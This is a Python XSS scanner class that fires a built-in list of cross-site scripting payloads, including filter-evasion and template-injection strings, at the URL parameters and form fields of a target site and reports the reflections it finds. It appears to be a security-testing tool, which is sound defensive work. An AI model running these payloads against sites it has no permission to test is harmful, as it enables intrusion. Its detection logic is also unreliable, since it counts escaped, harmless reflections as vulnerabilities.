import requests
from bs4 import BeautifulSoup
import re
import urllib.parse
from urllib.parse import urljoin
import logging
import html

logger = logging.getLogger(__name__)

class XssTester:
    def __init__(self):
        self.payloads = [
            # Basic XSS
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe onload=alert(1)>",
            
            # Attribute-based XSS
            "\" onmouseover=alert(1) \"",
            "' onmouseover=alert(1) '",
            "javascript:alert(1)",
            
            # Event handlers
            "onmouseover=alert(1)",
            "onfocus=alert(1)",
            "onclick=alert(1)",
            
            # Encoded XSS
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
            
            # Template-based XSS
            "${alert(1)}",
            "{{constructor.constructor('alert(1)')()}}",
            
            # DOM-based XSS
            "<img src=x onerror=this.src='javascript:alert(1)'>",
            "<input autofocus onfocus=alert(1)>",
            
            # Filter evasion
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<script>eval('al'+'ert(1)')</script>",
            "<img src=x oneonerrorrror=alert(1)>",
            
            # Protocol-based XSS
            "javascript:alert(1)//",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:alert(1)",
            
            # Exotic payloads
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "<marquee onstart=alert(1)>",
            "<details ontoggle=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            
            # Context-specific payloads
            "\"></select><script>alert(1)</script>",
            "\"</textarea><script>alert(1)</script>",
            "\"></iframe><script>alert(1)</script>"
        ]
        
        self.contexts = {
            'html': r'<[^>]*>',
            'script': r'<script[^>]*>.*?</script>',
            'attribute': r'[a-zA-Z-]+=(["\'])[^"\']*\1',
            'url': r'(?:src|href|data|location)\s*=\s*(["\'])[^"\']*\1',
            'style': r'<style[^>]*>.*?</style>',
            'comment': r'<!--.*?-->'
        }
        
    def test_url(self, url):
        """Test URL parameters for XSS vulnerabilities"""
        results = {
            'vulnerable': False,
            'vulnerable_params': [],
            'vulnerable_forms': [],
            'details': []
        }
        
        try:
            # Test URL parameters
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            # Test each parameter
            for param in params:
                param_results = self._test_parameter(url, param)
                if param_results['vulnerable']:
                    results['vulnerable'] = True
                    results['vulnerable_params'].append(param)
                    results['details'].extend(param_results['details'])
            
            # Test forms
            form_results = self.scan_forms(url)
            if form_results['vulnerable']:
                results['vulnerable'] = True
                results['vulnerable_forms'].extend(form_results['vulnerable_forms'])
                results['details'].extend(form_results['details'])
            
            return results
            
        except Exception as e:
            logger.error(f"Error in XSS test: {e}")
            return {
                'vulnerable': False,
                'error': str(e),
                'vulnerable_params': [],
                'vulnerable_forms': [],
                'details': []
            }
    
    def _test_parameter(self, url, param):
        """Test a specific parameter for XSS vulnerabilities"""
        results = {
            'vulnerable': False,
            'details': []
        }
        
        try:
            # Get original response for comparison
            original_response = requests.get(url, verify=False, timeout=10)
            original_content = original_response.text
            
            # Identify context(s) where parameter value appears
            contexts = self._identify_contexts(original_content, param)
            
            # Test payloads based on context
            for context in contexts:
                context_payloads = self._get_context_payloads(context)
                for payload in context_payloads:
                    try:
                        # Inject payload
                        test_url = self._inject_payload(url, param, payload)
                        response = requests.get(test_url, verify=False, timeout=10)
                        
                        # Check if payload is reflected without encoding
                        if payload in response.text:
                            results['vulnerable'] = True
                            results['details'].append({
                                'type': 'reflected_raw',
                                'context': context,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Payload reflected without encoding'
                            })
                            continue
                        
                        # Check if payload is reflected with basic encoding
                        encoded_payload = html.escape(payload)
                        if encoded_payload in response.text:
                            results['vulnerable'] = True
                            results['details'].append({
                                'type': 'reflected_encoded',
                                'context': context,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Payload reflected with basic encoding'
                            })
                            continue
                        
                        # Check for partial reflections that might still be dangerous
                        stripped_payload = payload.strip('<>"\'')
                        if stripped_payload in response.text:
                            results['vulnerable'] = True
                            results['details'].append({
                                'type': 'reflected_partial',
                                'context': context,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Payload partially reflected'
                            })
                            continue
                        
                    except Exception as e:
                        results['details'].append({
                            'type': 'error',
                            'context': context,
                            'parameter': param,
                            'payload': payload,
                            'message': str(e)
                        })
                        continue
        
        except Exception as e:
            results['details'].append({
                'type': 'error',
                'message': str(e)
            })
        
        return results
    
    def _identify_contexts(self, content, param):
        """Identify the context(s) where a parameter value appears"""
        found_contexts = []
        param_value = self._get_parameter_value(content, param)
        
        if not param_value:
            return ['html']  # Default to HTML context if can't find parameter
        
        for context, pattern in self.contexts.items():
            if re.search(pattern, content):
                found_contexts.append(context)
        
        return found_contexts or ['html']
    
    def _get_context_payloads(self, context):
        """Get payloads specific to the identified context"""
        if context == 'script':
            return [p for p in self.payloads if 'script' in p.lower() or 'javascript:' in p.lower()]
        elif context == 'attribute':
            return [p for p in self.payloads if 'on' in p.lower() or '"' in p or "'" in p]
        elif context == 'url':
            return [p for p in self.payloads if 'javascript:' in p.lower() or 'data:' in p.lower()]
        elif context == 'style':
            return [p for p in self.payloads if 'expression' in p.lower() or 'url' in p.lower()]
        else:
            return self.payloads  # Use all payloads for HTML context
    
    def _get_parameter_value(self, content, param):
        """Extract the current value of a parameter from the content"""
        # Try to find the parameter in various contexts
        patterns = [
            rf'{param}=(["\'])([^"\']*)\1',  # Quoted value
            rf'{param}=([^ >]*)',  # Unquoted value
        ]
        
        for pattern in patterns:
            match = re.search(pattern, content)
            if match:
                return match.group(2) if len(match.groups()) > 1 else match.group(1)
        return None
    
    def _inject_payload(self, url, param, payload):
        """Inject XSS payload into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))
    
    def scan_forms(self, url):
        """Scan forms on a page for XSS vulnerabilities"""
        results = {
            'vulnerable': False,
            'vulnerable_forms': [],
            'details': []
        }
        
        try:
            response = requests.get(url, verify=False, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_results = self._test_form(url, form)
                if form_results['vulnerable']:
                    results['vulnerable'] = True
                    results['vulnerable_forms'].append(form.get('action', ''))
                    results['details'].extend(form_results['details'])
        
        except Exception as e:
            results['details'].append({
                'type': 'error',
                'message': str(e)
            })
        
        return results
    
    def _test_form(self, base_url, form):
        """Test a form for XSS vulnerabilities"""
        results = {
            'vulnerable': False,
            'details': []
        }
        
        try:
            # Get form details
            action = form.get('action', '')
            if not action:
                action = base_url
            elif not action.startswith(('http://', 'https://')):
                action = urljoin(base_url, action)
            
            method = form.get('method', 'get').lower()
            
            # Test each input field
            for input_field in form.find_all(['input', 'textarea']):
                if input_field.get('type') not in ['submit', 'button', 'image', 'reset', 'file', 'hidden']:
                    field_name = input_field.get('name')
                    if field_name:
                        # Identify context for the input field
                        context = self._identify_input_context(input_field)
                        context_payloads = self._get_context_payloads(context)
                        
                        for payload in context_payloads:
                            try:
                                # Test with payload
                                data = {field_name: payload}
                                if method == 'get':
                                    response = requests.get(action, params=data, verify=False, timeout=10)
                                else:
                                    response = requests.post(action, data=data, verify=False, timeout=10)
                                
                                # Check for successful XSS
                                if payload in response.text:
                                    results['vulnerable'] = True
                                    results['details'].append({
                                        'type': 'form_xss',
                                        'form': action,
                                        'field': field_name,
                                        'context': context,
                                        'payload': payload,
                                        'evidence': 'Payload reflected without encoding'
                                    })
                                    continue
                                
                                # Check encoded versions
                                encoded_payload = html.escape(payload)
                                if encoded_payload in response.text:
                                    results['vulnerable'] = True
                                    results['details'].append({
                                        'type': 'form_xss_encoded',
                                        'form': action,
                                        'field': field_name,
                                        'context': context,
                                        'payload': payload,
                                        'evidence': 'Payload reflected with encoding'
                                    })
                                    continue
                                
                            except Exception as e:
                                results['details'].append({
                                    'type': 'error',
                                    'form': action,
                                    'field': field_name,
                                    'payload': payload,
                                    'message': str(e)
                                })
                                continue
        
        except Exception as e:
            results['details'].append({
                'type': 'error',
                'message': str(e)
            })
        
        return results
    
    def _identify_input_context(self, input_field):
        """Identify the context of an input field"""
        input_type = input_field.get('type', '').lower()
        
        if input_type in ['url', 'image']:
            return 'url'
        elif input_type == 'text' and any(attr in input_field.attrs for attr in ['onchange', 'onkeyup', 'onkeydown']):
            return 'script'
        elif input_field.name == 'textarea':
            return 'html'
        else:
            return 'attribute' 